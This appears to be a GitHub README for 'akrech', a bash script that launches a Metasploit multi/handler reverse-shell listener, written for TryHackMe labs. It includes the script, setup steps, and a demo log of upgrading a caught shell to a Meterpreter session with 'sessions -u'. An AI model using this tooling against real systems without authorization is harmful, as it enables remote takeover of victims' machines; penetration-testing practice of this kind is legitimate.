# akrech-reverse-shell-listener


█░█ █▀█ █▀▀ █▀█ ▄▀█ █▀▄ █▀▀   █▄█ █▀█ █░█ █▀█   █▄░█ █▀█ █▀█ █▀▄▀█ ▄▀█ █░░  
█▄█ █▀▀ █▄█ █▀▄ █▀█ █▄▀ ██▄   ░█░ █▄█ █▄█ █▀▄   █░▀█ █▄█ █▀▄ █░▀░█ █▀█ █▄▄  

█▀█ █▀▀ █░█ █▀▀ █▀█ █▀ █▀▀ ▄▄ █▀ █░█ █▀▀ █░░ █░░  
█▀▄ ██▄ ▀▄▀ ██▄ █▀▄ ▄█ ██▄ ░░ ▄█ █▀█ ██▄ █▄▄ █▄▄  

█ █▄░█ ▀█▀ █▀█   ▄▀█
█ █░▀█ ░█░ █▄█   █▀█

█▀▄▀█ █▀▀ ▀█▀ █▀▀ █▀█ █▀█ █▀█ █▀▀ ▀█▀ █▀▀ █▀█  
█░▀░█ ██▄ ░█░ ██▄ █▀▄ █▀▀ █▀▄ ██▄ ░█░ ██▄ █▀▄  

█▀ █░█ █▀▀ █░░ █░░
▄█ █▀█ ██▄ █▄▄ █▄▄

please read carefully, if you havn't any idea about "how to upgrade a normal reverse-shell to a meterpreter shell"



It's the first tool that I had made with bash scripting.
a very simple but useful(maybe) tool for tryhackme users.

#tested on kali-linux

#PROCESS
git clone https://github.com/a-k-r-e-c-h/akrech-rev-shell
$ cd akrech-rev-shell
$ chmod +x akrech.sh
$ ./akrech.sh                <-----#use "nano akrech.sh" if you want's to change the exploit or the IP/network interface.


[note]
***move/copy "akrech.sh" to "/bin" to access it from anywhere on your terminal***   <---$ mv akrech.sh /bin --->



<----after getting a shell successfully--->
ENTER(1) --- "background"
ENTER(2) --- "sessioions -u 1"     <---I used (1) for session 1...else use your sessions id...view it by enter"sessions">

#wait a while
#if everything works fine...then you are gonna get a meterpreter session...check it by ENTER "sessions"

ENTER(3) --- sessions -i 2        <---you should get a meterpreter shell successfully--->

<<<<<<<----------------------------------------------------------------------->>>>>>>
█▀▀▄ █▀▀ █▀▄▀█ █▀▀█ 
█░░█ █▀▀ █░▀░█ █░░█ 
▀▀▀░ ▀▀▀ ▀░░░▀ ▀▀▀▀


┌──(root💀kali)-[/home/kali/akrech-rev-shell]
└─# ./akrech.sh   
 


░█████╗░██╗░░██╗██████╗░███████╗░█████╗░██╗░░██╗
██╔══██╗██║░██╔╝██╔══██╗██╔════╝██╔══██╗██║░░██║
███████║█████═╝░██████╔╝█████╗░░██║░░╚═╝███████║
██╔══██║██╔═██╗░██╔══██╗██╔══╝░░██║░░██╗██╔══██║
██║░░██║██║░╚██╗██║░░██║███████╗╚█████╔╝██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝
 
                       git- a-k-r-e-c-h
                       mail- itz.a.k.r.e.c.h@gmail.com
                      
[*] Using configured payload generic/shell_reverse_tcp
lhost => tun0
lport => 4444
[*] Started reverse TCP handler on 10.8.217.33:4444 
[*] Command shell session 1 opened (10.8.217.33:4444 -> 10.8.217.33:39094) at 2021-09-07 13:35:34 -0400

background

Background session 1? [y/N]  y
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell sparc/bsd               10.8.217.33:4444 -> 10.8.217.33:39094 (10.8.217.33)

msf6 exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.217.33:4433 
[*] Sending stage (984904 bytes) to 10.8.217.33
[*] Meterpreter session 2 opened (10.8.217.33:4433 -> 10.8.217.33:41528) at 2021-09-07 13:36:12 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 



<<<<<<<------------------------------------------------------------------------->>>>>>

*akrech   ---a simple metasploit automated reverse-shell-listener tool written in bash.
*this tool is made for time saving & day-to-day usage.
*metasploit has must be installed to ran this script on your machine.
*found me on tweeter-- https://twitter.com/a_k_r_e_c_H

#!/bin/bash

 
echo -e " \e[91m


░█████╗░██╗░░██╗██████╗░███████╗░█████╗░██╗░░██╗
██╔══██╗██║░██╔╝██╔══██╗██╔════╝██╔══██╗██║░░██║
███████║█████═╝░██████╔╝█████╗░░██║░░╚═╝███████║
██╔══██║██╔═██╗░██╔══██╗██╔══╝░░██║░░██╗██╔══██║
██║░░██║██║░╚██╗██║░░██║███████╗╚█████╔╝██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝"
echo -e " \e[5m
                       git- a-k-r-e-c-h
                       mail- itz.a.k.r.e.c.h@gmail.com
                      "

msfconsole -q -x " use ```exploit/multi/handler```;    <---change this, if you wants to set another module--->
  set lhost ```tun0``` ;                               <---change this, if you wants to set another IP/network interface---> 
   set lport ```4444``` ;                              <---change this, if you wants to listen on another port--->
    exploit ;"
